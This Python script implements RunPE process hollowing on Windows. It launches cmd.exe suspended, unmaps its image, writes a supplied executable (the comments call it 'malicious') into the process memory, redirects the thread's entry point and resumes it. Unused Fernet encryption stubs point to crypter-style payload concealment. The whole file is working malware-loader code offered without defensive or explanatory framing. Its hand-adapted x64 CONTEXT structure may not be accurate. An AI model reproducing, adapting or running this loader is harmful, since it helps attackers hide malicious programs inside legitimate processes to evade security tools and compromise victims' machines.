import base64
import subprocess
from cryptography.fernet import Fernet
from itertools import cycle
import sys, pefile
import ctypes
import os

input_file = sys.argv[1]
input_filename_w_extention = os.path.basename(input_file)
# remove the .exe extension
input_filename = input_filename_w_extention[:-4]
output_filename = input_filename
output_path = os.getcwd()

key = Fernet.generate_key()
cipher = Fernet(key)

with open(input_file, 'rb') as f:
    data = f.read()

# encrypted_data = cipher.encrypt(data)

BYTE      = ctypes.c_ubyte
WORD      = ctypes.c_ushort
DWORD     = ctypes.c_uint32
LPSTR 	  = ctypes.c_char_p 
HANDLE    = ctypes.c_void_p

CREATE_SUSPENDED = 0x0004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class PROCESS_INFORMATION(ctypes.Structure):
	_fields_ = [
	('hProcess', HANDLE), 
	('hThread', HANDLE), 
	('dwProcessId', DWORD), 
	('dwThreadId', DWORD),
	]
	
class STARTUPINFO(ctypes.Structure):
	_fields_ = [
	('cb', DWORD), 
	('lpReserved', LPSTR),    
	('lpDesktop', LPSTR),
	('lpTitle', LPSTR),
	('dwX', DWORD),
	('dwY', DWORD),
	('dwXSize', DWORD),
	('dwYSize', DWORD),
	('dwXCountChars', DWORD),
	('dwYCountChars', DWORD),
	('dwFillAttribute', DWORD),
	('dwFlags', DWORD),
	('wShowWindow', WORD),
	('cbReserved2', WORD),
	('lpReserved2', DWORD),    
	('hStdInput', HANDLE),
	('hStdOutput', HANDLE),
	('hStdError', HANDLE),
	]

class FLOATING_SAVE_AREA(ctypes.Structure):
	_fields_ = [
	("ControlWord", DWORD),
    ("StatusWord", DWORD),
    ("TagWord", DWORD),
    ("ErrorOffset", DWORD),
    ("ErrorSelector", DWORD),
    ("DataOffset", DWORD),
    ("DataSelector", DWORD),
    ("RegisterArea", BYTE * 80),
    ("Cr0NpxState", DWORD),
	]	
	
class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", DWORD),
        ("Dr0", ctypes.c_uint64),  # changed from DWORD
        ("Dr1", ctypes.c_uint64),  # changed from DWORD
        ("Dr2", ctypes.c_uint64),  # changed from DWORD
        ("Dr3", ctypes.c_uint64),  # changed from DWORD
        ("Dr6", ctypes.c_uint64),  # changed from DWORD
        ("Dr7", ctypes.c_uint64),  # changed from DWORD
        ("FloatSave", FLOATING_SAVE_AREA),
        ("SegGs", ctypes.c_uint64),  # changed from DWORD
        ("SegFs", ctypes.c_uint64),  # changed from DWORD
        ("SegEs", ctypes.c_uint64),  # changed from DWORD
        ("SegDs", ctypes.c_uint64),  # changed from DWORD
        ("Rdi", ctypes.c_uint64),  # changed from DWORD
        ("Rsi", ctypes.c_uint64),  # changed from DWORD
        ("Rbx", ctypes.c_uint64),  # changed from DWORD
        ("Rdx", ctypes.c_uint64),  # changed from DWORD
        ("Rcx", ctypes.c_uint64),  # changed from DWORD
        ("Rax", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),  # changed from DWORD
        ("Rip", ctypes.c_uint64),  # changed from DWORD
        ("SegCs", ctypes.c_uint64),  # changed from DWORD
        ("EFlags", DWORD),
        ("Rsp", ctypes.c_uint64),  # changed from DWORD
        ("SegSs", ctypes.c_uint64),  # changed from DWORD
        ("ExtendedRegisters", BYTE * 80),
    ]


si = STARTUPINFO()
si.cb = ctypes.sizeof(STARTUPINFO)
pi = PROCESS_INFORMATION()
cx = CONTEXT()
# control registers for thread
cx.ContextFlags = 0x10007


# Decrypt the content
# decrypted_software = cipher.decrypt(encrypted_data)
decrypted_software = data

pe = pefile.PE(data=decrypted_software)
fd_size = len(decrypted_software)
print("\n[+] Payload size : "+str(fd_size))

buffer = ctypes.create_string_buffer(decrypted_software, fd_size)
p = ctypes.addressof(buffer)

print("[+] Pointer : "+str(hex(p)))
filepath = u"C:\\Windows\\System32\\cmd.exe"
pefilepath = pefile.PE(filepath)

print("[*] Image Base: 0x{:X}".format(pe.OPTIONAL_HEADER.ImageBase))
print("[*] Entry Point: 0x{:X}".format(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
print("[*] Rax: 0x{:X}".format(cx.Rax))



# Create new process in suspedend mode using a legitimate executable
if ctypes.windll.kernel32.CreateProcessW(None, filepath, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
	print ("[+] Process successfuly launched")
	print ("[+] PID : %d\n" %pi.dwProcessId)
else:	
	print ("Failed to create new process")
	print ("Error Code: ", ctypes.windll.kernel32.GetLastError())
	sys.exit(1)



# Unmap the view of sections of the new process created
if ctypes.windll.ntdll.NtUnmapViewOfSection(pi.hProcess, LPSTR(pefilepath.OPTIONAL_HEADER.ImageBase)):
	print ("[+] Unmap View Of Section Succeed")
else:
	print ("Failed to unmap the original exe")
	print ("Error Code: ", ctypes.windll.kernel32.GetLastError())
	sys.exit(1)



# Allocate memory to base address of malicious executable in suspended process
if ctypes.windll.kernel32.VirtualAllocEx(pi.hProcess, ctypes.c_void_p(pe.OPTIONAL_HEADER.ImageBase), pe.OPTIONAL_HEADER.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE):
	print ("[+] Virtual Alloc Succeed")
else:
	print ("Failed to allocate virtual memory")
	print ("Error Code: ", ctypes.windll.kernel32.GetLastError())



# Write in memory malicious file's header
if ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase), ctypes.c_void_p(p), ctypes.c_int(pe.OPTIONAL_HEADER.SizeOfHeaders), None):
	print ("[+] Write Process Memory Succeed")
	print ("Error Code: ", ctypes.windll.kernel32.GetLastError())

else:	
	print ("Failed to write to process memory")
	print ("Error Code: ", ctypes.windll.kernel32.GetLastError())
	sys.exit(1)



# Write sections one by one to memory
for section in pe.sections:
    if ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase+section.VirtualAddress), ctypes.c_void_p(p+section.PointerToRawData), ctypes.c_int(section.SizeOfRawData), None):
        print("[+] Writing Section {} Succeed".format(section.Name.decode('utf-8')))
        print("    - Virtual Address: 0x{:X}".format(pe.OPTIONAL_HEADER.ImageBase + section.VirtualAddress))
        print("    - Raw Data Address: 0x{:X}".format(p + section.PointerToRawData))
        print("    - Section Size: {}".format(section.SizeOfRawData))
    else:
        print("Failed to write to process memory")
        print("Error Code: ", ctypes.windll.kernel32.GetLastError())
        sys.exit(1)



# Get CPU context of this process
if ctypes.windll.kernel32.GetThreadContext(pi.hThread, ctypes.byref(cx)):
    print ("[+] Get Thread Context Succeed")
    rsp_value = cx.Rsp
else:
    print ("Failed to get thread context")
    print ("Error Code: ", ctypes.windll.kernel32.GetLastError())
    sys.exit(1)



# Print debugging information
print("[*] Image Base: 0x{:X}".format(pe.OPTIONAL_HEADER.ImageBase))
print("[*] Entry Point: 0x{:X}".format(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
print("[*] Old Rax: 0x{:X}".format(cx.Rax))



# Set the new RSP for the context
cx.Rsp = rsp_value

# Set the new RIP for the context (entry point of the payload)
entry_point = pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint
cx.Rip = entry_point

print("[*] New Rax: 0x{:X}".format(cx.Rax))




# Replace CPU context
if ctypes.windll.kernel32.SetThreadContext(pi.hThread, ctypes.byref(cx)):
    print ("[+] Set Thread Context Succeed")
else:
    print ("Failed to set thread context")
    print ("Error Code: ", ctypes.windll.kernel32.GetLastError())
    sys.exit(1)

# Resume the process so windows continues the execution
if ctypes.windll.kernel32.ResumeThread(pi.hThread):
	print ("[+] Resume Thread Succeed")
	print ("\n[*] RunPE Succeed")
else:
	print ("Failed to resume thread")
	print ("Error Code: ", ctypes.windll.kernel32.GetLastError())
	sys.exit(1)
